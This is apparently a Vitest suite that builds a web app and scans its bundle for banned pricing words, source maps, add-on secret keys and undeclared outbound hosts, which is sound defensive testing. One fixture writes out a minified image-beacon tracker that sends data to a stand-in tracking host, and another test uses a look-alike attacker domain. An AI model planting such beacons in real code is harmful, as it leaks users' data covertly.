/**
 * The release grep, run where the release runs it: over BUILT OUTPUT.
 *
 * Every other guard in this repo reads sources. That is one inference away from
 * the thing that ships — a minifier inlines a default, a bundler keeps a legal
 * comment, a string arrives from a dependency — and the sweep (17 §2) does not
 * read sources at all. So this suite builds the app and greps the bytes.
 *
 * It also checks the two things a bundle is the only honest place to check: that
 * no add-on's credential setting and no real third-party hostname reached the
 * browser (24 D15, D11). Both are true of the sources — the vendored halves
 * carry no server module — and "true of the sources" is exactly the claim a
 * packer refuses to take on trust.
 *
 * THE ONE CARVE-OUT IS PRINTED, NOT HIDDEN. Third-party chunks are excluded
 * from the copy grep — React's own code says `CANNOT_UPGRADE` five times and no
 * amount of editing this repo will change that — and the exclusion is decided
 * by PROVENANCE rather than by a filename pattern: a second, sourcemapped build
 * says which emitted chunks were assembled entirely out of `node_modules/`, and
 * only those are skipped. The suite logs the exempted files, their module
 * counts and every allowed homograph on every run, so a reviewer reads the
 * carve-out instead of finding it.
 */

import { execFileSync } from 'node:child_process';
import { existsSync, readdirSync, readFileSync, rmSync, statSync } from 'node:fs';
import { basename, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import {
  connectedBackend,
  offendingAddresses,
  sendersIn,
  type InertOrigin,
} from './testing/egress.ts';

import {
  HOMOGRAPH_TOKENS,
  PRO_PHRASES,
  SUBSTRING_BANNED,
  TIERING_PATTERNS,
  bundleOffences,
  readableText,
} from './testing/lexicon.ts';

const ROOT = join(new URL('.', import.meta.url).pathname, '..');
const DIST = join(ROOT, 'dist');
/** Scratch output for the provenance build. Gitignored; deleted after use. */
const PROVENANCE = join(ROOT, '.provenance');

/**
 * Built here rather than assumed to be on disk.
 *
 * `dist/` is gitignored and the verification order is typecheck → test → build,
 * so a suite that only read an existing `dist/` would silently pass on a clean
 * clone by grepping nothing, and would grep STALE bytes everywhere else.
 *
 * A CHILD PROCESS, and `NODE_ENV=production`, both on purpose. Vite decides
 * whether a build is a production one from `NODE_ENV` before it looks at the
 * mode, and under Vitest that variable is `test` — an in-process `build()` call
 * therefore produces a DIFFERENT bundle from the one that ships. A suite that
 * greps a bundle nobody deploys is worth nothing, so this shells out exactly as
 * the release does.
 *
 * THE SECOND BUILD IS THE PROVENANCE ONE and it does not ship. It is the same
 * config with sourcemaps on, into a scratch directory: a sourcemap names every
 * module that went into a chunk, which is the only first-hand evidence that a
 * chunk is third-party code. `dist/` stays exactly what `npm run build` writes.
 */
beforeAll(() => {
  const vite = join(ROOT, 'node_modules', '.bin', 'vite');
  const env = { ...process.env, NODE_ENV: 'production' };
  execFileSync(vite, ['build'], { cwd: ROOT, env, stdio: 'pipe' });
  rmSync(PROVENANCE, { recursive: true, force: true });
  execFileSync(vite, ['build', '--sourcemap', 'true', '--outDir', '.provenance'], {
    cwd: ROOT,
    env,
    stdio: 'pipe',
  });
}, 240_000);

/** The scratch build is evidence, not output. It does not outlive the suite. */
afterAll(() => {
  rmSync(PROVENANCE, { recursive: true, force: true });
});

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const full = join(dir, entry);
    return statSync(full).isDirectory() ? walk(full) : [full];
  });
}

/**
 * What a browser actually loads.
 *
 * `.map` files are excluded and it is not a dodge: a source map is a verbatim
 * copy of the SOURCES, so grepping one greps this repo's own comments —
 * including the comments that exist to explain the ban. Sources have their own
 * guard (`sources.test.ts`), which is where a comment belongs. Nothing anyone
 * executes is skipped.
 *
 * THE EXEMPTION IS ONLY HONEST WHILE THE FILES DO NOT EXIST, and it is asserted
 * below rather than assumed. A sibling repo shipped this wave's first blocker —
 * a translator's note quoting a banned word — and then shipped it a SECOND time
 * through a 258 KB `client.js.map` after the comment itself was fixed, because
 * the gate had been taught to skip maps and nothing checked that there were
 * none. An exemption a build flag can silently turn into a hole is not an
 * exemption; it is a blind spot with a comment on it.
 */
const built = (): string[] => walk(DIST).filter((f) => !f.endsWith('.map'));

/** `assets/react-BTWVIjLd.js` → `react`: rollup writes `[name]-[hash].js`. */
const chunkName = (file: string) => basename(file).replace(/-[A-Za-z0-9_-]{8}\.js(\.map)?$/, '');

/**
 * The chunks that are 100% dependency code, established from their sourcemaps.
 *
 * A chunk qualifies only if it has modules and EVERY ONE of them came out of
 * `node_modules/`. `vite.config.ts` happens to route React and Lucide into two
 * such chunks today, but nothing here is keyed to those names: rename a chunk,
 * add a third dependency chunk, or let one app module leak into `icons` and
 * this recomputes rather than lying.
 */
function thirdPartyChunks(): Map<string, number> {
  const found = new Map<string, number>();
  for (const map of walk(PROVENANCE).filter((f) => f.endsWith('.js.map'))) {
    const sources = (JSON.parse(readFileSync(map, 'utf8')) as { sources?: string[] }).sources ?? [];
    const modules = sources.filter((s) => !s.startsWith('\0') && !s.includes('vite/preload'));
    if (modules.length === 0) continue;
    if (modules.every((s) => s.includes('node_modules/'))) {
      found.set(chunkName(map.replace(/\.map$/, '')), modules.length);
    }
  }
  return found;
}

const rel = (file: string) => file.slice(DIST.length + 1);

/**
 * A built file as a READER would meet it.
 *
 * Scripts are minified, so their identifiers are a tool's invention and their
 * words are all in string literals — `readableText` keeps the second and drops
 * the first. Everything else (`index.html`, the stylesheet) this repo wrote by
 * hand, so it is read whole: there is no minifier between the author and the
 * bytes, and nothing to excuse.
 */
function readable(file: string): string {
  const text = readFileSync(file, 'utf8');
  return file.endsWith('.js') ? readableText(text) : text;
}

/**
 * ── NOTHING ELSE IN THIS REPO READS A `dist/` IT DID NOT BUILD ──────────────
 *
 * [Added 2026-08-11, round 6, after a verifier watched a build register an
 * add-on that exists nowhere in the other host's source — a `dist/` left behind
 * by an earlier cross-app experiment.]
 *
 * `dist/` is gitignored and is written by whatever ran last, which may be a
 * different app, a different branch or a hand-vendored experiment. That is
 * perfectly safe for exactly one suite — this one, which shells out to `vite
 * build` in `beforeAll` and therefore greps bytes it produced itself — and is a
 * silent hole in any other.
 *
 * A guard that only said "this suite builds first" would be a comment. This is
 * the rule stated over every suite in the repo: reading `<root>/dist` is
 * allowed here and nowhere else. Reading somebody ELSE's `dist` (the manifest
 * validator's published package, for instance) is a different thing and is not
 * caught by it — the pattern is a `dist` joined directly onto a repo root.
 */
describe('no other gate reads a dist/ it did not build', () => {
  const OWN_DIST = [
    /join\(\s*[A-Za-z_$][\w$]*\s*,\s*['"`]dist['"`]/,
    /join\(\s*process\.cwd\(\)\s*,\s*['"`]dist['"`]/,
  ];

  function suites(dir: string): string[] {
    return readdirSync(dir).flatMap((entry) => {
      const full = join(dir, entry);
      if (statSync(full).isDirectory()) return entry === 'vendor' ? [] : suites(full);
      return /\.test\.tsx?$/.test(full) ? [full] : [];
    });
  }

  it('is the only suite that opens this app’s own build output', () => {
    const here = join(ROOT, 'src', 'builtOutput.test.ts');
    const offenders = suites(join(ROOT, 'src'))
      .filter((file) => file !== here)
      .filter((file) => {
        const code = readFileSync(file, 'utf8');
        return OWN_DIST.some((pattern) => pattern.test(code));
      })
      .map((file) => file.slice(ROOT.length + 1));
    expect(
      offenders,
      '\nThese suites read `dist/` without building it, so they grep whatever was ' +
        'written there last — possibly by another app:\n' +
        offenders.join('\n') +
        '\n',
    ).toEqual([]);
  });

  it('builds it here rather than finding it, which is what makes that safe', () => {
    // The pairing, asserted: the exemption above is only honest while this file
    // actually runs the build. Delete the `execFileSync` and the exemption
    // becomes the hole it was written to close.
    const code = readFileSync(join(ROOT, 'src', 'builtOutput.test.ts'), 'utf8');
    expect(code).toMatch(/beforeAll\([\s\S]*execFileSync\(vite, \['build'\]/);
  });
});

describe('the built artefact carries no source maps', () => {
  /*
   * Paired with the `.map` exemption above: the gate may skip maps only because
   * there are none. Flip `sourcemap` on in vite.config.ts and this fails, which
   * is the point — the exemption and the absence are one decision, not two.
   */
  it('emits no .map alongside the bundle', () => {
    const maps = walk(DIST).filter((f) => f.endsWith('.map'));
    expect(maps, `dist/ carries source maps the ban grep cannot see: ${maps.join(', ')}`).toEqual([]);
  });

  it('leaves no sourceMappingURL pointing at one', () => {
    const offenders = walk(DIST)
      .filter((f) => f.endsWith('.js') || f.endsWith('.css'))
      .filter((f) => readFileSync(f, 'utf8').includes('sourceMappingURL'));
    expect(offenders).toEqual([]);
  });
});

describe('the build wrote something to grep', () => {
  it('emits an entry document and at least one script', () => {
    expect(existsSync(join(DIST, 'index.html'))).toBe(true);
    expect(built().filter((f) => f.endsWith('.js')).length).toBeGreaterThan(0);
  });

  it('names its third-party chunks from their sourcemaps, and says so out loud', () => {
    const thirdParty = thirdPartyChunks();
    const exempt = built().filter((f) => thirdParty.has(chunkName(f)));

    /*
     * PRINTED ON EVERY RUN. 24 §10's verification line says the sweep runs over
     * `dist/` excluding `demo/`, and this suite excludes a little more than
     * that — so the exclusion is on the console beside the result rather than
     * three files away in a comment somebody has to go looking for.
     */
    // eslint-disable-next-line no-console
    console.log(
      [
        'built-output grep — exempted by dependency provenance:',
        ...[...thirdParty].map(([name, n]) => `  chunk "${name}" · ${n} modules, all node_modules/`),
        ...exempt.map((f) => `  file  ${rel(f)}`),
        'allowed homographs (exact token, case-insensitive):',
        ...HOMOGRAPH_TOKENS.map((h) => `  "${h.token}" · ${h.language} · ${h.means}`),
        'allowed "pro" phrases:',
        ...PRO_PHRASES.map((p) => `  "${p.phrase}" · ${p.language} · ${p.means}`),
        `tiering patterns checked with no carve-out: ${TIERING_PATTERNS.map((r) => r.source).join(' ')}`,
      ].join('\n'),
    );

    // The carve-out is narrow: some chunks qualify, and the app's own do not.
    expect(exempt.length).toBeGreaterThan(0);
    expect([...thirdParty.keys()].sort()).not.toContain('index');
    expect([...thirdParty.keys()].sort()).not.toContain('add-ons');
  });

  it('keeps every app string out of the third-party chunks', () => {
    // The carve-out below rests on this: the dependency chunks hold no copy of
    // this app's, so excluding them from the copy grep cannot hide one.
    const thirdParty = thirdPartyChunks();
    for (const file of built().filter((f) => thirdParty.has(chunkName(f)))) {
      const text = readFileSync(file, 'utf8');
      for (const needle of ['cust.artwork.', 'shop.materials.', 'addon.host.']) {
        expect(text.includes(needle), `${rel(file)} · ${needle}`).toBe(false);
      }
    }
  });
});

describe('the vocabulary ban, over built output', () => {
  it('contains none of the banned substrings, case-insensitively', () => {
    /*
     * THE FULL LIST, `free` and `plan` included. What the gate allows it allows
     * one exact token at a time — see `testing/lexicon.ts` — and the allowances
     * are printed above, so a word that had to be excused is a word a reviewer
     * has read.
     */
    const thirdParty = thirdPartyChunks();
    const offenders: string[] = [];
    for (const file of built().filter((f) => !thirdParty.has(chunkName(f)))) {
      for (const hit of bundleOffences(readable(file))) {
        offenders.push(`${rel(file)} · "${hit.word}" in "${hit.token}" · …${hit.context}…`);
      }
    }
    expect(offenders).toEqual([]);
  });

  /**
   * THE SCANNER THAT DECIDES WHAT "READABLE" MEANS, DRIVEN OVER ALL SEVEN OF
   * ITS STATES — because everything above rests on it and a silent
   * desynchronisation would read the rest of a file as one long string, or as
   * none at all, and either way go green.
   */
  it('reads a script’s words and not its code', () => {
    const fixture = [
      'const a="a plan for the week";',
      'let mo=3,b=6,E=b/mo;', //          division, not a "/mo" in anybody's copy
      'const re=/["\'`]/g;', //           a regex holding all three quotes
      '// a line comment mentioning a free upgrade',
      '/* a block comment mentioning premium pricing */',
      'const t=`a ${b} tier of ${{x:"nested"}.x} thing`;',
      'const esc="he said \\"billing\\" out loud";',
    ].join('\n');

    const words = readableText(fixture);
    // Every literal, in order, and nothing else.
    expect(words.split('\n')).toEqual([
      'a plan for the week',
      'a ',
      ' tier of ',
      'nested',
      ' thing',
      'he said "billing" out loud',
    ]);

    // What the reader can read is caught; what only the minifier can see is not.
    const words_ = bundleOffences(words).map((o) => o.word);
    expect(words_).toContain('plan');
    expect(words_).toContain('tier');
    expect(words_).toContain('billing');
    expect(words_).not.toContain('/mo'); //     `E=b/mo` — the false positive
    expect(words_).not.toContain('free'); //    the line comment
    expect(words_).not.toContain('premium'); // the block comment

    // And the raw bytes DO carry all of those, so the difference is this
    // function and not a weaker word list.
    const raw = bundleOffences(fixture).map((o) => o.word);
    expect(raw).toContain('/mo');
    expect(raw).toContain('free');
  });

  it('finds the app’s own copy in the bundle it just scanned', () => {
    /*
     * The scanner earns the exemption only if it is still reading the copy. An
     * `index` chunk whose readable text had collapsed to nothing would make
     * every check above pass by scanning an empty string.
     */
    const app = built().filter((f) => f.endsWith('.js') && !thirdPartyChunks().has(chunkName(f)));
    const words = app.map(readable).join('\n');
    expect(words.length).toBeGreaterThan(20_000);
    for (const needle of ['cust.artwork.', 'addon.host.', 'Marlow Press']) {
      expect(words.includes(needle), needle).toBe(true);
    }
  });

  it('keeps the entry document clear of the FULL list', () => {
    // `index.html` is markup this repo wrote by hand — no minifier, no locale
    // bundle, no identifiers — so the whole list applies to it unmodified, with
    // no homograph allowance of any kind.
    const html = readFileSync(join(DIST, 'index.html'), 'utf8').toLowerCase();
    expect(SUBSTRING_BANNED.filter((word) => html.includes(word))).toEqual([]);
  });

  it('would catch the substrings the release catches', () => {
    // An absence proves nothing unless the check is shown to bite. These are
    // the two traps D10 names, plus the two words a shortened list dropped.
    const bites = (text: string) => bundleOffences(text).map((o) => o.word);
    expect(bites('a short explanation of the sizes')).toContain('plan');
    expect(bites('the frontier of large format')).toContain('tier');
    expect(bites('delivery is free on this one')).toContain('free');
    expect(bites('a Pro account')).toContain('pro');
    // And the allowances are exactly that — allowances, not holes.
    expect(bites('Das ist eingeplant.')).toEqual([]);
    expect(bites('0,04 $ pro Stück')).toEqual([]);
    expect(bites('we have no plans')).toContain('plan');
    expect(bites('proof, process, product')).toEqual([]);
    // The tiering IDEA, which no English banned run would have caught.
    expect(bites('Profi-Tarif')).toContain('\\bprofi');
    expect(bites('专业版')).toContain('专业版');
    expect(bites('prémiový doplněk')).toContain('prémiov');
  });

  it('writes no link whose path a banned grep would find', () => {
    const offenders: string[] = [];
    for (const file of built()) {
      for (const [, href] of readFileSync(file, 'utf8').matchAll(/href=\\?["']([^"'\\]+)/g)) {
        if (href!.toLowerCase().includes('/mo')) offenders.push(`${rel(file)} · ${href}`);
      }
    }
    expect(offenders).toEqual([]);
  });
});

describe('nothing an add-on keeps to itself reached the browser', () => {
  /**
   * ── THE FIFTH HOST-LOCAL LIST HOLDING AN ADD-ON'S FACTS ───────────────────
   *
   * What stood here was five hand-written needles:
   *
   *     ['api_key', 'account_number', 'CarrierCredentials',
   *      'express.api.dhl.com', 'api.canva.com']
   *
   * Every one of them is a fact about an ADD-ON — two `secret: true` setting
   * keys out of the delivery add-on's manifest, the type its server half reads
   * them into, and the two `network.allow` hostnames — written down inside an
   * app that merely receives them. It is the same shape as `HOSTED_SLOTS`, the
   * Czech "pro" carve-out, the ar-EG numeral allowances and the inert origins
   * above, and it is the one with the worst consequence, because it fails
   * SILENTLY in the direction that matters:
   *
   *   A THIRD CREDENTIALLED ADD-ON, vendored into either shop, would ship its
   *   secret setting keys and its real endpoint with this gate fully green. A
   *   grep cannot look for a needle nobody told it about, and nothing anywhere
   *   would have gone red to say so.
   *
   * The two hosts' copies had already drifted by one entry — this app carried
   * `api.canva.com` and the studio did not, with the studio's comment still
   * announcing "the last two" of a list with one.
   *
   * So the needles travel with the add-on, in its own `add-on-facts.ts`, and
   * the add-on's manifest suite asserts they cover every `secret: true` key and
   * every allowed hostname that manifest declares. This app greps for whatever
   * it has VENDORED.
   */
  const VENDORED_FACTS = import.meta.glob<{
    NEVER_IN_A_BROWSER?: readonly { text: string; why: string }[];
  }>('./add-ons/vendor/*/add-on-facts.ts', { eager: true });

  const needles = Object.values(VENDORED_FACTS).flatMap((module) => [
    ...(module.NEVER_IN_A_BROWSER ?? []),
  ]);

  it('greps for something at all, off a declaration in every add-on it vendors', () => {
    // The discovery is only as honest as what it finds: a renamed export or a
    // sync that dropped the file would leave this gate looking for nothing and
    // passing forever, which is the defect back with a different cause.
    const declared = Object.entries(VENDORED_FACTS);
    expect(declared.length, 'no vendored add-on-facts were found at all').toBeGreaterThan(0);
    const silent = declared
      .filter(([, module]) => module.NEVER_IN_A_BROWSER === undefined)
      .map(([file]) => file);
    expect(silent, 'these vendored packages export no NEVER_IN_A_BROWSER').toEqual([]);
    expect(needles.length, 'no add-on declared anything server-only').toBeGreaterThan(0);
  });

  it('carries no secret setting key and no real third-party hostname', () => {
    // 24 D15 and D11 in the artefact. Every needle is an add-on's own
    // declaration of something that lives on its SERVER half; a demo's
    // transports are all demo ones, so none of them belongs in a browser.
    const offenders: string[] = [];
    for (const file of built()) {
      const text = readFileSync(file, 'utf8');
      for (const needle of needles) {
        if (text.includes(needle.text)) offenders.push(`${rel(file)} · ${needle.text}`);
      }
    }
    expect(offenders, `\n${offenders.join('\n')}\n`).toEqual([]);
  });

  it('bites on a leak of any of them, which is what makes the grep worth having', () => {
    // Driven over a fixture rather than over `dist/`, so this stays true on a
    // day the bundle is clean — which is every day until it is not.
    const leaked = `const s={${needles[0]!.text}:"sk_live_x"};`;
    expect(needles.some((needle) => leaked.includes(needle.text))).toBe(true);
  });
});

/**
 * D11 OVER THE ARTEFACT: NOT ONE ADDRESS THIS APP DID NOT DECLARE.
 *
 * ── WHY THE BUNDLE AND NOT ONLY THE SOURCES ─────────────────────────────────
 *
 * `sources.test.ts` states the same rule over `src/`. It is one inference away
 * from what a browser loads: a bundler folds a template literal into a finished
 * address, a dependency brings its own, an unminified comment survives into
 * `dist/`, and the vendored add-on halves arrive here as bytes rather than as
 * files anybody re-reads. This wave's mutant — `new Image(); img.src =
 * "https://…"` inside a vendored delivery component — reached exactly this
 * directory with every gate in three repos green.
 *
 * Minification is the reason this is worth its own gate and not a copy of the
 * source one: in `dist/` the mutant reads `new Image` with the empty argument
 * list dropped, so a pattern anchored on `Image(` sees nothing. The ADDRESS is
 * the thing minification cannot disguise — a request needs somewhere to go, and
 * the destination is a string literal in the bytes.
 *
 * ── WHAT THIS GATE DELIBERATELY DOES NOT DO, AND WHY ────────────────────────
 *
 * It does not run `sendersIn` over the built output, and that is a limitation
 * worth stating rather than hiding: Vite's module-preload polyfill compiles a
 * literal `fetch(n.href, r)` into the entry chunk. It is same-origin, it is the
 * bundler's own code, and it cannot be removed — so a sender scan here would
 * need a carve-out on day one, and a carve-out is where the last nine holes in
 * this wave came from.
 *
 * The senders are checked where they are OURS (`sources.test.ts`, over `src/`),
 * the addresses are checked here where nothing can hide them, and what a URL
 * sink is actually HANDED is checked in `add-ons/egress.test.tsx`, which
 * instruments the running page. No one of the three is complete; the reason
 * there are three is that each covers what the others cannot see.
 */
describe('nothing in the artefact can reach a host we do not control (24 D11)', () => {
  /**
   * Every address allowed to appear in this app's bundle, and why it is inert.
   *
   * None of them can cause a request. Two are XML namespaces — identifiers for
   * a vocabulary, which no agent dereferences — and one is a message React
   * prints. Anything else, from any file, is a finding: this app declares no
   * egress at all, and the add-ons' server halves are not in this bundle.
   */
  const OURS: readonly InertOrigin[] = [
    {
      origin: 'http://www.w3.org',
      why: 'the SVG, MathML, xlink and XML namespaces React and this app write onto elements — names for a vocabulary, never fetched',
    },
    {
      origin: 'https://react.dev',
      why: "the address React prints in a minified error message so a developer can look the number up. It is text in a `throw`, and nothing loads it",
    },
  ];
  /**
   * ── AND THE ADD-ONS' ADDRESSES ARE THE ADD-ONS' TO DECLARE ────────────────
   *
   * The two Canva endpoints used to be written out here as well as in
   * `sources.test.ts`, in an app that only receives that add-on. Both lists
   * read the same declarations now — every add-on exports `INERT_ORIGINS` from
   * its own `add-on-facts.ts`, the sync vendors it, and this reads whatever
   * this app has vendored. See `sources.test.ts` for the AC20/D21 argument.
   *
   * The bundle is where the two lists legitimately differ: React writes the SVG
   * and MathML namespaces and prints its own error address, and neither is any
   * add-on's doing.
   */
  const VENDORED_ORIGINS = import.meta.glob<{
    INERT_ORIGINS?: readonly { origin: string; why: string }[];
  }>("./add-ons/vendor/*/add-on-facts.ts", { eager: true });

  /*
   * ── AND THE BACKEND A CONNECTED BUILD WAS POINTED AT (28-T26) ─────────────
   *
   * Empty in every demo build, which is every build the marketplace serves and
   * every build CI makes. When `VITE_ADMINIUM_API_BASE_URL` is set, Vite inlines
   * it here as a literal and this is the declaration that says so. It is the
   * ONLY address the connected mode adds — measured, not assumed — and it is
   * declared rather than inert, which `connectedBackend`'s `why` states.
   */
  const INERT: readonly InertOrigin[] = [
    ...OURS,
    ...Object.values(VENDORED_ORIGINS).flatMap((module) => [...(module.INERT_ORIGINS ?? [])]),
    ...connectedBackend(process.env["VITE_ADMINIUM_API_BASE_URL"]),
  ];

  it('reads a declaration off every add-on this bundle was built from', () => {
    const declared = Object.entries(VENDORED_ORIGINS);
    expect(declared.length, 'no vendored inert-origin declarations were found').toBeGreaterThan(0);
    const silent = declared
      .filter(([, module]) => module.INERT_ORIGINS === undefined)
      .map(([file]) => file);
    expect(silent, 'these vendored packages export no INERT_ORIGINS').toEqual([]);
  });

  it('reads every emitted file, with no extension exempt', () => {
    // An address is bytes, so nothing here is skipped for being machine-written
    // or awkward to keep clean. `built()` already refuses to exist if the build
    // wrote nothing.
    expect(built().length).toBeGreaterThan(2);
  });

  it('names no address outside the ones declared inert', () => {
    const offences = built().flatMap((file) =>
      offendingAddresses(readFileSync(file, 'utf8'), INERT).map((url) => `${rel(file)} → ${url}`),
    );
    expect(offences, `\n${offences.join('\n')}\n`).toEqual([]);
  });

  it('would report the mutant, in the spelling the minifier gives it', () => {
    // Driven over the detector, not restated beside it. The second line is what
    // the tracker actually looked like in `dist/` — `new Image` with no
    // parentheses — and it is why `SENDERS` stopped anchoring on one.
    const minified = 'const o=new Image;o.src="https://tracking.example-analytics.net/p?c="+e;';
    expect(offendingAddresses(minified, INERT)).toEqual([
      'https://tracking.example-analytics.net/p?c=',
    ]);
    expect(sendersIn(minified)).toEqual(['new Image — an image beacon']);
    // And an origin is forgiven exactly, never by prefix.
    expect(offendingAddresses('https://react.dev.attacker.test/x', INERT)).toEqual([
      'https://react.dev.attacker.test/x',
    ]);
  });
});
